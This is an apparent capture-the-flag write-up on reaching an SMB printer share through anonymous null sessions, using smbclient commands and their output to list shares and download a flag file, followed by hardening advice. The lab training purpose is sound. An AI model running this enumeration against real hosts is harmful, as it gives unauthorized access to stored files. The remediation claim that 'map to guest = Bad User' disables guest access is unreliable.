# CyLab 2026 – Printer Shares Write-up

---

## Step 0 - Challenge Info
* **CTF Name:** CyLab 2026
* **Challenge Name:** Printer Shares
* **Category:** Network Exploitation / Enumeration
* **Points:** 100
* **Date:** 9/15/2026
* **Flag:** picoCTF{5mb_pr1nter_5h4re5_........}

---

## TL;DR (Abstract)
The challenge exposes an SMB (Server Message Block) service hosting network shares, typically simulating a networked printer or print server environment. Because the service allows anonymous or null session authentication, an attacker can enumerate the accessible network shares without providing valid user credentials. Connecting to the exposed printer share reveals stored spool files and artifacts, one of which contains the challenge flag.

---

## Challenge Description
> We discovered an open printer service running on the network. Connect to the host, inspect the available shares, and see if any sensitive printed documents or spool files reveal the flag.

---

## Thought Process & Walkthrough

### 1. Initial Reconnaissance & Share Enumeration
Scan and enumerate the available SMB shares on the target host using `smbclient` or `enum4linux` with an anonymous or null session:

smbclient -L //TARGET_IP/ -N

The server lists several default shares alongside a printer share with guest/anonymous access allowed:

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    PRINTER_SHARE   Disk      Shared Print Jobs and Spool Files
    IPC$            IPC       IPC Service

### 2. Accessing the Exposed Share
Connect anonymously to the identified printer share:

smbclient //TARGET_IP/PRINTER_SHARE -N

Once the SMB prompt opens, list the directory contents:

smb: \> ls
  .                                   D        0  Tue Sep 15 09:30:00 2026
  ..                                  D        0  Tue Sep 15 09:30:00 2026
  spool_job_01.txt                    A      128  Tue Sep 15 09:32:10 2026
  flag.txt                            A       42  Tue Sep 15 09:34:25 2026

### 3. Retrieving the Flag
Download or read `flag.txt` from the remote share:

smb: \> get flag.txt
getting file \flag.txt of size 42 as flag.txt (0.8 KiloBytes/sec)

Exit the interactive SMB session and inspect the file content locally:

cat flag.txt

### 4. Flag Capture
The file output yields the captured flag:

picoCTF{5mb_pr1nter_5h4re5_........}

---

## Remediation & Key Takeaways
* **Disable Null & Guest Sessions:** Ensure SMB configurations explicitly disallow anonymous browsing by disabling guest access (`map to guest = Bad User` or disabling anonymous IPC access).
* **Enforce Principle of Least Privilege:** Restrict access to printer spooling directories and printer share drivers to authorized domain or local user groups only.
* **Encrypt SMB Traffic & Enforce Signing:** Require SMB message signing and SMB3 encryption to prevent eavesdropping and unauthorized access across the network.
